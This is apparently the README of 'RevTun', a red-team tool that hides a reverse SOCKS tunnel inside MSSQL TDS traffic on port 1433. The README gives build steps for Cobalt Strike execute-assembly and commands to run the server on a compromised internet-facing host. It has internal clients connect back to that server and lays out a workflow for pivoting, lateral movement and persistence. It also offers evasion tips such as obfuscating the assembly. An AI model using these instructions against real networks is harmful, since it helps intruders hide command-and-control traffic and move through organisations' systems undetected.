# RevTun - MSSQL Reverse Tunnel

RevTun is a reverse tunneling tool that disguises network traffic as legitimate MSSQL database communications using the Tabular Data Stream (TDS) protocol. This allows for covert network pivoting and firewall evasion by leveraging the commonly trusted MSSQL port 1433.

## 🔧 How It Works

RevTun operates using a client-server architecture:

1. **Server Component**: Listens on port 1433 (standard MSSQL port) and responds to TDS protocol handshakes
2. **Client Component**: Connects to the server using authentic MSSQL TDS protocol packets
3. **Proxy Activation**: When a client connects, the server automatically activates a SOCKS proxy (default port 1080)
4. **Traffic Tunneling**: All proxy traffic is encapsulated within TDS packets, appearing as legitimate database queries

The result is a fully functional SOCKS proxy that operates through what appears to be normal MSSQL database traffic.

## 🚀 Key Features

- **Protocol Authenticity**: Full TDS protocol implementation with proper handshakes
- **TLS Encryption**: Optional end-to-end encryption for enhanced security
- **Multi-Platform**: Supports Windows, Linux, and macOS
- **Cobalt Strike Ready**: Optimized for `execute-assembly` operations
- **SOCKS Proxy**: Standard SOCKS5 proxy for tool compatibility
- **Stealth Operations**: Traffic indistinguishable from legitimate MSSQL connections

## 📋 Prerequisites

### C# Implementation (Primary)
- **.NET 8.0 or later** for cross-platform builds
- **.NET Framework 4.8** for Cobalt Strike compatibility
- No external dependencies required

### Python Implementation (Alternative)
- **Python 3.7+** with standard library only
- Lightweight option for constrained environments
- Located in `revtun_server.py` (server only)

## 🔨 Building

### Quick Build (Multi-Platform)
Use the provided PowerShell script for automated builds:

```powershell
# Builds all targets: .NET Framework 4.8, Linux x64, Windows x64
.\build-multi.ps1
```

### Manual Builds

#### Cross-Platform Builds (.NET 8.0)
```bash
# Windows x64 (self-contained single file)
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true

# Linux x64 (self-contained single file)
dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true
```

#### Cobalt Strike Build (.NET Framework 4.8)
```bash
# Build for execute-assembly compatibility
dotnet build -c Release -f net48 -p:Platform=AnyCPU
```

**Output Locations:**
- **Cobalt Strike**: `.\bin\Release\net48\revtun.exe`
- **Linux x64**: `.\bin\Release\net8.0\linux-x64\publish\revtun`
- **Windows x64**: `.\bin\Release\net8.0\win-x64\publish\revtun.exe`

## 🎯 Usage

### Basic Server Setup
```bash
# C# Server (recommended)
./revtun server --port 1433 --proxy-port 1080 --verbose
```

### Client Connection
```bash
# Connect to remote server with encryption
./revtun client --host server.example.com --port 1433 --encrypt --verbose
```

## ⚔️ Cobalt Strike Integration

RevTun is optimized for red team operations and Cobalt Strike workflows.

### Deployment Commands

#### Server Deployment (External Host)
```bash
# Deploy server on internet-facing compromised host
execute-assembly revtun.exe server --port 1433 --proxy-port 1080 --require-encryption --verbose
```

#### Client Connection (Internal Host)
```bash
# Connect from internal network back to external server
execute-assembly revtun.exe client --host [external-server-ip] --port 1433 --encrypt
```

### Operational Workflow

1. **Deploy Server**: Use `execute-assembly` to deploy server on external compromised host
2. **Establish Tunnel**: Connect clients from internal networks using reverse connection
3. **Pivot & Lateral Movement**: Use SOCKS proxy for further network access
4. **Maintain Persistence**: TDS traffic blends with legitimate database communications

### OPSEC Considerations

**✅ Advantages:**
- Traffic appears as legitimate MSSQL database connections
- Uses standard port 1433 (commonly allowed through firewalls)
- TLS encryption available for additional security
- Minimal network signatures

**⚠️ Considerations:**
- Monitor for unusual MSSQL connection patterns
- Consider assembly obfuscation for enhanced evasion
- Test connectivity in lab environment first
- Use encryption in sensitive environments

## 🔐 Encryption & Security

RevTun supports multiple security modes for different operational requirements.

### Server Encryption Modes

| Mode | Command | Description |
|------|---------|-------------|
| **Mixed** (Default) | `--verbose` | Accepts both encrypted and plaintext connections |
| **Required** | `--require-encryption` | Forces TLS encryption for all connections |
| **Disabled** | `--no-encryption` | Disables encryption support entirely |

### Client Encryption Modes

| Mode | Command | Description |
|------|---------|-------------|
| **Plaintext** (Default) | `--verbose` | No encryption requested |
| **Requested** | `--encrypt` | Requests TLS encryption from server |
| **Required** | `--require-encryption` | Requires TLS encryption (fails if unavailable) |

### Encryption Examples

```bash
# Server requiring encryption
./revtun server --require-encryption --verbose

# Client with optional encryption
./revtun client --encrypt --host server.example.com

# Client requiring encryption
./revtun client --require-encryption --host server.example.com --verbose
```

## 📊 Command Line Options

### Server Options

| Option | Short | Default | Description |
|--------|-------|---------|-------------|
| `--port` | `-p` | `1433` | MSSQL server port |
| `--proxy-port` | | `1080` | SOCKS proxy port |
| `--bind` | | `0.0.0.0` | Bind address |
| `--verbose` | `-v` | `false` | Enable verbose logging |
| `--require-encryption` | | `false` | Require TLS for all connections |
| `--no-encryption` | | `false` | Disable encryption support |

### Client Options

| Option | Short | Default | Description |
|--------|-------|---------|-------------|
| `--host` | `-h` | `localhost` | Server hostname |
| `--port` | `-p` | `1433` | Server port |
| `--username` | `-u` | `sa` | SQL username (for TDS handshake) |
| `--verbose` | `-v` | `false` | Enable verbose logging |
| `--debug` | | `false` | Enable debug output + interactive session |
| `--encrypt` | | `false` | Request TLS encryption |
| `--require-encryption` | | `false` | Require TLS encryption |